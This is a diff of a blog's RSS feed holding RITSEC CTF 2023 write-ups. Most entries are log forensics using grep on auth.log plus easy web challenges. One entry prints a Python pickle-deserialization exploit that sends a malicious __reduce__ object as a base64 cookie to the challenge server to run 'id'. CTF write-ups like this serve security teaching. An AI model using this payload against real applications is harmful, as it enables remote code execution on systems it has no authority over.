class=&quot;s&quot;&gt;utf-8&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)})&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -119,8 +242,8 @@
 &lt;p&gt;This is the only challenge that I’ve given constructive or critical feedback for. With that said, it didn’t ruin the fun or my opinion or RITSEC CTF.  They put on such an awesome CTF this year, and I’m glad I was able to participate!&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/web/x-men-lore</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/web/x-men-lore</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/web/x-men-lore</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/web/x-men-lore</guid>
       </item>
     
       <item>
@@ -129,7 +252,7 @@
 &lt;p&gt;You are led to a website called that is literally just a rickroll.  There’s a “don’t sign in” button that takes you to the infamous video.  Props to the author for the amount of trolling here.&lt;/p&gt;
 
 &lt;h2 id=&quot;finding-the-flag&quot;&gt;Finding the Flag&lt;/h2&gt;
-&lt;p&gt;Well, there isn’t any obvious way of interacting with this website aside from the 2 static HTML pages.  So let’s take a look at the source.  First, I’ll look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Don't.html&lt;/code&gt;.  Right away, I see a lot of comments at the bottom of the page.  It seems to be the lyrics, and boy oh boy I’m getting RickRolled at this point.  I decided to scroll through them on a hunch, and I see a comment in the middle of the lyrics that says “It might be here!”
+&lt;p&gt;Well, there isn’t any obvious way of interacting with this website aside from the 2 static HTML pages.  So let’s take a look at the source.  First, I’ll look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Don&apos;t.html&lt;/code&gt;.  Right away, I see a lot of comments at the bottom of the page.  It seems to be the lyrics, and boy oh boy I’m getting RickRolled at this point.  I decided to scroll through them on a hunch, and I see a comment in the middle of the lyrics that says “It might be here!”
 Scrolling down a bit more, I found this line:&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/rick-roll/comment-1.png&quot; alt=&quot;Partial Flag in HTML Comment&quot; title=&quot;Partial Flag&quot; /&gt;
@@ -147,8 +270,8 @@ That looks like a partial flag if I’ve ever seen one!  Let’s grab the entire
 &lt;p&gt;When I first started finding the parts of the flags, there was some strange encoding issues where it wasn’t rendering correctly in the dev tools.  I should have just downloaded the source to  begin with, and I would have avoided some guess and check work later.  This lesson may or may not repeat itself in another challenge…&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/web/rick-roll</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/web/rick-roll</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/web/rick-roll</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/web/rick-roll</guid>
       </item>
     
       <item>
@@ -164,12 +287,12 @@ That looks like a partial flag if I’ve ever seen one!  Let’s grab the entire
 
 &lt;h2 id=&quot;keep-digging&quot;&gt;Keep Digging&lt;/h2&gt;
 &lt;p&gt;How would we set the SETUID bit?  Well, there’s different ways of doing it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt;, so let’s just start there:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep 'chmod' tty.log
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep &apos;chmod&apos; tty.log
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-4/chmod-tty-log.png&quot; alt=&quot;grep 'chmod' ttyl.log&quot; title=&quot;grep 'chmod' tty.log&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-4/chmod-tty-log.png&quot; alt=&quot;grep &apos;chmod&apos; ttyl.log&quot; title=&quot;grep &apos;chmod&apos; tty.log&quot; /&gt;
 &lt;br /&gt;&lt;br /&gt;
 Here, we see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod u+s&lt;/code&gt; (setting the SUID) was used on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/find&lt;/code&gt;.  This isn’t something you would normally do.  Let’s dig a bit deeper.&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep 'chmod u+s /usr/bin/find' -A 25 auth.log
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep &apos;chmod u+s /usr/bin/find&apos; -A 25 auth.log
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Here, we are asking for the 25 lines AFTER the match from grep.  Again, you could use an editor if you prefer by grabbing the line number using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt; flag in grep.&lt;/p&gt;
 
@@ -190,8 +313,8 @@ Interestingly, we see the attackers do this very command a few lines later.  Fir
 &lt;p&gt;I cannot emphasize enough how much I enjoyed this entire series of challenges.  These were my favorite part of the CTF, as I feel like CTFs are usually centered around attacking when there can be plenty of interesting &lt;em&gt;defending&lt;/em&gt; exercises.  Kudos to the authors!&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/forensics/red-team-activity-4</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/forensics/red-team-activity-4</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/forensics/red-team-activity-4</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/forensics/red-team-activity-4</guid>
       </item>
     
       <item>
@@ -203,29 +326,29 @@ Interestingly, we see the attackers do this very command a few lines later.  Fir
 &lt;p&gt;This time, we were asked tofind the location of the script that ran &lt;em&gt;repeatedly&lt;/em&gt; (emphasis mine).  On linux, what do you think of when you want to run something over and over in an unattended way?  &lt;a href=&quot;https://en.wikipedia.org/wiki/Cron&quot;&gt;Cron&lt;/a&gt;, of course!&lt;/p&gt;
 
 &lt;h2 id=&quot;our-initial-filter-ftw&quot;&gt;Our Initial Filter FTW&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-1/grep-vim-tty-log.png&quot; alt=&quot;grep 'vim' ttyl.log&quot; title=&quot;grep 'vim' tty.log&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-1/grep-vim-tty-log.png&quot; alt=&quot;grep &apos;vim&apos; ttyl.log&quot; title=&quot;grep &apos;vim&apos; tty.log&quot; /&gt;
 I kind of feel bad leaving this post so short, but… if you already understand cron, you’ll know that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/spool/cron/crontabs/root&lt;/code&gt; is the root user’s crontab, which is how crons are scheduled in Linux.  This is the answer, and we can move on to number 4!&lt;/p&gt;
 
 &lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
 &lt;p&gt;Again, our initial filtering and a little knowledge of how Linux works is helping us breeze through these challenges.  In my conclusion for &lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-2&quot;&gt;Red Team Activity 2’s Writeup&lt;/a&gt;, I mentioned that you could see the red teamers adding persistence and doing other things.  Start to think about how you may want to go about preserving evidence on this server while also neutralizing the red team’s ability to access or execute scripts.&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/forensics/red-team-activity-3</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/forensics/red-team-activity-3</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/forensics/red-team-activity-3</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/forensics/red-team-activity-3</guid>
       </item>
     
       <item>
         <title>RITSEC 2023 - Forensics / Red Team Activity 2</title>
         <description>&lt;h1 id=&quot;picking-up-where-we-left-off&quot;&gt;Picking Up Where We Left Off&lt;/h1&gt;
-&lt;p&gt;In &lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-1&quot;&gt;Red Team Activity 1&lt;/a&gt;, we filtered the provided &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt; down to only commands run from a TTY, and then found all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt; commands that were run.  This writeup will reference &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tty.log&lt;/code&gt;, which was created in the previous exercise by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep -v 'tty:(none)' auth.log &amp;gt; tty.log&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;In &lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-1&quot;&gt;Red Team Activity 1&lt;/a&gt;, we filtered the provided &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt; down to only commands run from a TTY, and then found all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt; commands that were run.  This writeup will reference &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tty.log&lt;/code&gt;, which was created in the previous exercise by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep -v &apos;tty:(none)&apos; auth.log &amp;gt; tty.log&lt;/code&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;the-challenge&quot;&gt;The Challenge&lt;/h2&gt;
 &lt;p&gt;We were asked to find the name of the malicious service.  Looking at our screenshot of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt; entries from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tty.log&lt;/code&gt;, we can actually see that a service called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bluetoothd.service&lt;/code&gt; was touched.  If this is a server and not a desktop, I’m not sure why we would ever want a bluetooth service running… This seems sus.
-&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-1/grep-vim-tty-log.png&quot; alt=&quot;grep 'vim' ttyl.log&quot; title=&quot;grep 'vim' tty.log&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-1/grep-vim-tty-log.png&quot; alt=&quot;grep &apos;vim&apos; ttyl.log&quot; title=&quot;grep &apos;vim&apos; tty.log&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;looking-further-into-it&quot;&gt;Looking further into it&lt;/h2&gt;
 &lt;p&gt;So we know that there’s probably more context around that entry.  Let’s find the entry in the full &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt; to see what was going on around that time:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep -n 'bluetoothd.service' auth.log
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep -n &apos;bluetoothd.service&apos; auth.log
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;In the above command, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt; flag tells grep to provide the line number.  We can see that the entries are on lines 252 and 253 of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt;.  With this information, we can open the file in your favorite editor/reader/whatever you want to use and skip to that line number.&lt;/p&gt;
 
@@ -236,8 +359,8 @@ I kind of feel bad leaving this post so short, but… if you already understand 
 &lt;p&gt;I enjoy that these challenges are really continuations of the previous challenge.  Additionally, if you’re filtering in a smart way, they become way easier to pinpoint the attacks and what the red-teamers did.  As an exercise for fun, you could look for other interesting commands such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adduser&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useradd&lt;/code&gt; to see if they are creating a user for persistence, or maybe even &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt;.&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/forensics/red-team-activity-2</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/forensics/red-team-activity-2</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/forensics/red-team-activity-2</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/forensics/red-team-activity-2</guid>
       </item>
     
       <item>
@@ -251,7 +374,7 @@ I kind of feel bad leaving this post so short, but… if you already understand 
 
 &lt;h2 id=&quot;filtering-out-the-noise&quot;&gt;Filtering out the Noise&lt;/h2&gt;
 &lt;p&gt;There’s a lot of noise in this file.  There’s plenty of things that are just typical behavior on an Ubuntu machine.  In order to find out what’s going on here, we need to filter some of that noise out.  I’ve played a fair amount of &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;HackTheBox&lt;/a&gt;, and I know that as a red-teamer, I’d want to be working on a proper TTY. Let’s see if we can limit the file down to only the entires that were done from a TTY:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep -v 'tty:(none)' auth.log &amp;gt; tty.log
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep -v &apos;tty:(none)&apos; auth.log &amp;gt; tty.log
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;The above command uses grep to filter OUT the lines that have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tty:(none)&lt;/code&gt; in them, leaving us with only logs from where a proper TTY was used.  This file is now only 771 lines long, which is a lot better than 13k!
 &lt;br /&gt;&lt;br /&gt;
@@ -267,7 +390,7 @@ I kind of feel bad leaving this post so short, but… if you already understand 
   &lt;li&gt;nano
 Why these commands?  They’re how I would go about getting a script onto a linux machine.  It will either be downloaded or manually added to the machine.  I ran the following and looked at the lines for each, until I found what I was looking for when searching for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt;:
 &lt;br /&gt;&lt;br /&gt;
-&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-1/grep-vim-tty-log.png&quot; alt=&quot;grep 'vim' ttyl.log&quot; title=&quot;grep 'vim' tty.log&quot; /&gt;&lt;/li&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-1/grep-vim-tty-log.png&quot; alt=&quot;grep &apos;vim&apos; ttyl.log&quot; title=&quot;grep &apos;vim&apos; tty.log&quot; /&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&quot;what-did-we-just-find&quot;&gt;What Did We Just Find?&lt;/h2&gt;
@@ -277,8 +400,8 @@ Why these commands?  They’re how I would go about getting a script onto a linu
 &lt;p&gt;I loved this challenge, as it showcases why off-site logging is so important.  If you look carefully at the above screenshot, you can actually see that the attacker &lt;strong&gt;edited&lt;/strong&gt; auth.log.  In theory, if the logs are only stored locally, they could have erased their tracks and incident responders would have even less data to work with.&lt;/p&gt;
 </description>
         <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
-        <link>/blog/ritsec-ctf-2023/forensics/red-team-activity-1</link>
-        <guid isPermaLink="true">/blog/ritsec-ctf-2023/forensics/red-team-activity-1</guid>
+        <link>https://www.leoreading.com/blog/ritsec-ctf-2023/forensics/red-team-activity-1</link>
+        <guid isPermaLink="true">https://www.leoreading.com/blog/ritsec-ctf-2023/forensics/red-team-activity-1</guid>
       </item>
     
       <item>
@@ -303,16 +426,16 @@ Why these commands?  They’re how I would go about getting a script onto a linu
 
 &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
 
 
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'https://pickles-web.challenges.ctf.ritsec.club/order'&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'order'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;https://pickles-web.challenges.ctf.ritsec.club/order&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -324,9 +447,9 @@ Why these commands?  They’re how I would go about getting a script onto a linu
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/static/style.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Here's your order!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Here&apos;s your order!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'button'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;New Order&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;button&apos;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;New Order&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -340,16 +463,16 @@ Why these commands?  They’re how I would go about getting a script onto a linu
 
 &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
 
 
 &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'https://pickles-web.challenges.ctf.ritsec.club/order'&lt;/span&gt;
